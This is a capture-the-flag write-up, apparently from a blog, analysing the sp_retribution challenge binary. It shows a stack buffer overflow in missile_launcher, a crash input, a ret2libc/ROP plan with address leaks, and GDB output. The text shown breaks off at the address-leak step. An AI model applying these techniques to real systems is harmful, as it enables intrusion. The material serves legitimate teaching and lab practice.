<span class="code-red">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-red">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-red">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-red">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-red">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-red">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-red">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-red">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-red">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-red">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt; 1</span>

<span class="code-cyan">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>

<span class="code-cyan">Missile #1 stats: üöÄ</span>

<span class="code-cyan">[Power]: <span class="code-red">‚ñã‚ñã‚ñã<span class="code-yellow">‚ñã</span></span></span>

<span class="code-cyan">[Range]: <span class="code-red">‚ñã‚ñã‚ñã<span class="code-yellow">‚ñã‚ñã</span></span></span>

<span class="code-cyan">[Speed]: <span class="code-red">‚ñã‚ñã‚ñã<span class="code-yellow">‚ñã‚ñã‚ñã<span class="code-green">‚ñã‚ñã</span></span></span></span>

<span class="code-cyan">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>

<span class="code-cyan">Missile #2 stats: ‚òÑÔ∏è</span>

<span class="code-cyan">[Power]: <span class="code-red">‚ñã‚ñã‚ñã<span class="code-yellow">‚ñã‚ñã‚ñã<span class="code-green">‚ñã‚ñã‚ñã</span></span></span></span>

<span class="code-cyan">[Range]: <span class="code-red">‚ñã‚ñã‚ñã<span class="code-yellow">‚ñã‚ñã‚ñã<span class="code-green">‚ñã‚ñã</span></span></span></span>

<span class="code-cyan">[Speed]: <span class="code-red">‚ñã‚ñã</span></span>

<span class="code-cyan">-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>

<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt;</span>
</code></pre></div><p>So let&rsquo;s analyze <code>missile_launcher</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">missile_launcher</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> verify [</span><span class="mtk6">32</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> coord [</span><span class="mtk6">32</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[*] Current target</span><span class="mtk6">\'</span><span class="mtk4">s coordinates: x = [0x</span><span class="mtk6">%lx</span><span class="mtk4">], y = [0x</span><span class="mtk6">%lx</span><span class="mtk4">]</span><span class="mtk6">\n\n</span><span class="mtk4">[*] Insert new coordinates: x = [0x</span><span class="mtk6">%lx</span><span class="mtk4">], y = "</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">53e5854620fb399f</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">576b96b95df201f9</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">53e5854620fb399f</span><span class="mtk1">);</span>  

<span class="mtk1">  verify._0_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  verify._8_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  verify._16_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  verify._24_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, coord, </span><span class="mtk6">31</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[*] New coordinates: x = [0x53e5854620fb399f], y =</span><span class="mtk4"> </span><span class="mtk6">%s\n</span><span class="mtk4">[*] Verify new coordinates? (y/n): "</span><span class="mtk1">, coord);</span>

<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, verify, </span><span class="mtk6">132</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n%s</span><span class="mtk4">[-] Permission Denied! You need flag.txt in order </span><span class="mtk4">to proceed. Coordinates have been reset!</span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d70, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100d78);</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>The above function is vulnerable to Buffer Overflow since there is a variable called <code>verify</code> that has 32 bytes assigned as buffer, but the program is reading up to 132 bytes from <code>stdin</code> and storing the data into <code>verify</code>, overflowing the reserved buffer if the size of the input data is greater than 32 bytes.</p><p>We can check that we can crash the program:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./sp_retribution</span>


<span class="code-magenta">                                 Missile Launcher!</span>






<span class="code-magenta">                       ‚ñë</span>
<span class="code-magenta">                                                        ‚ñë      ‚ñë</span>
<span class="code-magenta">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-magenta">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-magenta">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>
<span class="code-magenta">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-magenta">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-magenta">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-magenta">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-magenta">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-magenta">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-magenta">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-magenta">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-magenta">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-magenta">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-magenta">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-magenta">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt; 2</span>

<span class="code-blue">[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]</span>

<span class="code-blue">[*] Insert new coordinates: x = [0x53e5854620fb399f], y = asdf</span>

<span class="code-blue">[*] New coordinates: x = [0x53e5854620fb399f], y = asdf</span>
<span class="code-blue">U</span>
<span class="code-blue">[*] Verify new coordinates? (y/n): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>  

<span class="code-red">[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!</span>
<span class="code-blue">zsh: segmentation fault (core dumped)  ./sp_retribution</span>
</code></pre></div><p>And the program crashes because when the program wants to return from <code>missile_launcher</code>, the saved return address which was on the stack now is overwritten with <code>0x4141414141414141</code> (our junk data). Since it is not a valid memory address, the program just crashes (segmentation fault).</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Since the binary has NX protection, we must use Return Oriented Programming (ROP) to execute arbitrary code. This technique makes use of gadgets, which are sets of instructions that end in <code>ret</code> (usually). We can add a list of addresses for gadgets on the stack so that when a gadget is executed, it returns to the stack and executes the next gadget. That is the meaning of ROP chain.</p><p>This is a bypass for NX protection since we are not executing instructions in the stack (shellcode), but we are redirecting the program to specific addresses that are executable and run the instructions we want.</p><p>In order to gain code execution, we will perform a ret2libc attack. This technique consists of calling <code>system</code> inside Glibc using <code>"/bin/sh"</code> as first parameter to the function (which is also inside Glibc). The problem we must handle is ASLR, which is a protection set for shared libraries that randomize a base address.</p><p>Since we want to call <code>system</code> and take <code>"/bin/sh"</code>, we need to know the addresses of those values inside Glibc at runtime (these addresses will change in every execution). Hence, we must find a way to leak an address inside Glibc because the only thing that is random is the base address of Glibc; the rest of the addresses are computed as offsets to that base address.</p><p>Since the binary has PIE enabled, we need to leak an address of the binary at runtime and compute the base address using offsets.</p><p>The process of leaking a function comes with calling <code>puts</code> using an address from the Global Offset Table (GOT) as first argument (for example, the same <code>puts</code>). This table contains the real addresses of the external functions used by the program (if they have been resolved). Since <code>puts</code> is used by the binary, to call it we can use the Procedure Linkage Table (PLT), which applies a jump instruction to the real address of <code>puts</code>.</p><p>One more thing to consider is the use of gadgets. Because of the calling conventions for 64-bit binaries, when calling a function, the arguments must be stored in registers (in order: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). For example, the instruction <code>pop rdi</code> will take the next value from the stack and store it in <code>$rdi</code>.</p><h2 id="exploit-development">Exploit development</h2><p>Nice, let&rsquo;s start with the leakage process. First of all, let&rsquo;s leak an address of the binary. The best is to run GDB and take a look at the variable <code>coord</code> before writing, because it is printed right after. Moreover, in the above output, we entered <code>asdf</code> as <code>coord</code> and the program printed <code>U</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sp_retribution</span>
Reading symbols from <span class="code-dark-green">sp_retribution</span>...
(No debugging symbols found in <span class="code-dark-green">sp_retribution</span>)
<span class="code-red">gef‚û§  </span>disassemble missile_launcher
Dump of assembler code for function missile_launcher:
   <span class="code-dark-blue">0x0000000000000a22</span> &lt;+0&gt;:     push   rbp
   <span class="code-dark-blue">0x0000000000000a23</span> &lt;+1&gt;:     mov    rbp,rsp
   <span class="code-dark-blue">0x0000000000000a26</span> &lt;+4&gt;:     sub    rsp,0x50
   <span class="code-dark-blue">0x0000000000000a2a</span> &lt;+8&gt;:     movabs rax,0x53e5854620fb399f
   <span class="code-dark-blue">0x0000000000000a34</span> &lt;+18&gt;:    mov    QWORD PTR [rbp-0x8],rax
   <span class="code-dark-blue">0x0000000000000a38</span> &lt;+22&gt;:    movabs rax,0x576b96b95df201f9
   <span class="code-dark-blue">0x0000000000000a42</span> &lt;+32&gt;:    mov    QWORD PTR [rbp-0x10],rax
   <span class="code-dark-blue">0x0000000000000a46</span> &lt;+36&gt;:    mov    rcx,QWORD PTR [rbp-0x8]
   <span class="code-dark-blue">0x0000000000000a4a</span> &lt;+40&gt;:    mov    rdx,QWORD PTR [rbp-0x10]
   <span class="code-dark-blue">0x0000000000000a4e</span> &lt;+44&gt;:    mov    rax,QWORD PTR [rbp-0x8]
   <span class="code-dark-blue">0x0000000000000a52</span> &lt;+48&gt;:    mov    rsi,rax
   <span class="code-dark-blue">0x0000000000000a55</span> &lt;+51&gt;:    lea    rdi,[rip+0x11f4]        # <span class="code-dark-blue">0x1c50</span>
   <span class="code-dark-blue">0x0000000000000a5c</span> &lt;+58&gt;:    mov    eax,0x0
   <span class="code-dark-blue">0x0000000000000a61</span> &lt;+63&gt;:    call   <span class="code-dark-blue">0x770</span> &lt;<span class="code-dark-yellow">printf@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000a66</span> &lt;+68&gt;:    mov    QWORD PTR [rbp-0x50],0x0
   <span class="code-dark-blue">0x0000000000000a6e</span> &lt;+76&gt;:    mov    QWORD PTR [rbp-0x48],0x0
   <span class="code-dark-blue">0x0000000000000a76</span> &lt;+84&gt;:    mov    QWORD PTR [rbp-0x40],0x0
   <span class="code-dark-blue">0x0000000000000a7e</span> &lt;+92&gt;:    mov    QWORD PTR [rbp-0x38],0x0
   <span class="code-dark-blue">0x0000000000000a86</span> &lt;+100&gt;:   lea    rax,[rbp-0x30]
   <span class="code-dark-blue">0x0000000000000a8a</span> &lt;+104&gt;:   mov    edx,0x1f
   <span class="code-dark-blue">0x0000000000000a8f</span> &lt;+109&gt;:   mov    rsi,rax
   <span class="code-dark-blue">0x0000000000000a92</span> &lt;+112&gt;:   mov    edi,0x0
   <span class="code-dark-blue">0x0000000000000a97</span> &lt;+117&gt;:   call   <span class="code-dark-blue">0x790</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000a9c</span> &lt;+122&gt;:   lea    rax,[rbp-0x30]
   <span class="code-dark-blue">0x0000000000000aa0</span> &lt;+126&gt;:   mov    rsi,rax
   <span class="code-dark-blue">0x0000000000000aa3</span> &lt;+129&gt;:   lea    rdi,[rip+0x1216]        # <span class="code-dark-blue">0x1cc0</span>
   <span class="code-dark-blue">0x0000000000000aaa</span> &lt;+136&gt;:   mov    eax,0x0
   <span class="code-dark-blue">0x0000000000000aaf</span> &lt;+141&gt;:   call   <span class="code-dark-blue">0x770</span> &lt;<span class="code-dark-yellow">printf@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000ab4</span> &lt;+146&gt;:   lea    rax,[rbp-0x50]
   <span class="code-dark-blue">0x0000000000000ab8</span> &lt;+150&gt;:   mov    edx,0x84
   <span class="code-dark-blue">0x0000000000000abd</span> &lt;+155&gt;:   mov    rsi,rax
   <span class="code-dark-blue">0x0000000000000ac0</span> &lt;+158&gt;:   mov    edi,0x0
   <span class="code-dark-blue">0x0000000000000ac5</span> &lt;+163&gt;:   call   <span class="code-dark-blue">0x790</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000aca</span> &lt;+168&gt;:   lea    rdx,[rip+0x2a7]        # <span class="code-dark-blue">0xd78</span>
   <span class="code-dark-blue">0x0000000000000ad1</span> &lt;+175&gt;:   lea    rsi,[rip+0x298]        # <span class="code-dark-blue">0xd70</span>
   <span class="code-dark-blue">0x0000000000000ad8</span> &lt;+182&gt;:   lea    rdi,[rip+0x1241]        # <span class="code-dark-blue">0x1d20</span>
   <span class="code-dark-blue">0x0000000000000adf</span> &lt;+189&gt;:   mov    eax,0x0
   <span class="code-dark-blue">0x0000000000000ae4</span> &lt;+194&gt;:   call   <span class="code-dark-blue">0x770</span> &lt;<span class="code-dark-yellow">printf@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000ae9</span> &lt;+199&gt;:   nop
   <span class="code-dark-blue">0x0000000000000aea</span> &lt;+200&gt;:   leave
   <span class="code-dark-blue">0x0000000000000aeb</span> &lt;+201&gt;:   ret
End of assembler dump.
<span class="code-red">gef‚û§  </span>break *missile_launcher+117
Breakpoint 1 at <span class="code-dark-blue">0xa97</span>
<span class="code-red">gef‚û§  </span>run
Starting program: ./sp_retribution
warning: the debug information found in "./glibc/ld-2.23.so" does not match "./glibc/ld-linux-x86-64.so.2" (CRC mismatch).  

warning: the debug information found in "./glibc/libc-2.23.so" does not match "./glibc/libc.so.6" (CRC mismatch).



<span class="code-blue">                                 Missile Launcher!</span>






<span class="code-blue">                       ‚ñë</span>
<span class="code-blue">                                                        ‚ñë      ‚ñë</span>
<span class="code-blue">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-blue">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-blue">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>
<span class="code-blue">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-blue">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-blue">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-blue">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-blue">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-blue">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-blue">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-blue">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-blue">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-blue">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-blue">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-blue">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt; 2</span>

<span class="code-blue">[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]</span>

<span class="code-blue">[*] Insert new coordinates: x = [0x53e5854620fb399f], y =</span>
<span class="code-blue">Breakpoint 1, 0x0000555555400a97</span> in <span class="code-dark-yellow">missile_launcher</span> ()
</code></pre></div><p>Now, the program is stopped at <code>read(0, coord, 31)</code>. The second argument (<code>coord</code>) is stored in <code>$rsi</code>, let&rsquo;s examine the memory:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x555555400a97</span> &lt;<span class="code-dark-yellow">missile_launcher</span>+117&gt;:       call   <span class="code-dark-blue">0x555555400790</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;  
<span class="code-green">gef‚û§  </span>x/8gx $rsi
<span class="code-dark-blue">0x7fffffffe590</span>: 0x0000555555400d68      0x0000555555400d70
<span class="code-dark-blue">0x7fffffffe5a0</span>: 0x0000555555400d78      0x0000555555400d80
<span class="code-dark-blue">0x7fffffffe5b0</span>: 0x576b96b95df201f9      0x53e5854620fb399f
<span class="code-dark-blue">0x7fffffffe5c0</span>: 0x00007fffffffe5e0      0x0000555555400c9d
</code></pre></div><p>Another way of visualizing the memory contents is using <code>hexdump</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>hexdump byte $rsi
0x00007fffffffe590     68 <span class="code-dark-yellow">0d</span> 40 55 55 55 <span class="code-grey">00</span> <span class="code-grey">00</span> 70 <span class="code-dark-yellow">0d</span> 40 55 55 55 <span class="code-grey">00</span> <span class="code-grey">00</span>    h.@UUU..p.@UUU..  
0x00007fffffffe5a0     78 <span class="code-dark-yellow">0d</span> 40 55 55 55 <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-dark-yellow">80</span> <span class="code-dark-yellow">0d</span> 40 55 55 55 <span class="code-grey">00</span> <span class="code-grey">00</span>    x.@UUU....@UUU..
